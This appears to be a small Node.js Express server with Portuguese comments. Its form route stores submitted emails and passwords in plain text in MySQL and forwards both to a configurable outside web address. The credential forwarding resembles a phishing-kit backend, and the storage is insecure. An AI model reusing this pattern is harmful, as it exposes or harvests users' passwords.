const express = require('express');
const app = express();
const bodyParser = require('body-parser');
const axios = require('axios');
const mysql = require('mysql');

// Configuração do bodyParser para lidar com dados JSON
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// Configuração do banco de dados
const db = mysql.createConnection({
    host: 'localhost',
    user: 'seu_usuario',
    password: 'sua_senha',
    database: 'sua_base_de_dados'
});

// Conexão com o banco de dados
db.connect(err => {
    if (err) {
        console.error('Erro ao conectar ao banco de dados:', err);
        return;
    }
    console.log('Conectado ao banco de dados');
});

// Rota para lidar com a submissão do formulário
app.post('/submit-form', (req, res) => {
    const email = req.body.email;
    const password = req.body.password;
    const redirectUrl = 'https://seu-endereco-web.com'; // Substitua pelo endereço web desejado

    const sql = 'INSERT INTO usuarios (email, password) VALUES (?, ?)';
    db.query(sql, [email, password], (err, result) => {
        if (err) {
            return res.status(500).send('Erro ao inserir dados no banco de dados');
        }

        // Envia os dados para o endereço web especificado
        axios.post(redirectUrl, { email, password })
            .then(response => {
                res.status(200).send('Dados salvos com sucesso e enviados para o endereço web!');
            })
            .catch(error => {
                console.error('Erro ao enviar dados para o endereço web:', error);
                res.status(500).send('Erro ao enviar dados para o endereço web');
            });
    });
});

// Inicia o servidor
const port = 3000;
app.listen(port, () => {
    console.log(`Servidor rodando na porta ${port}`);
});
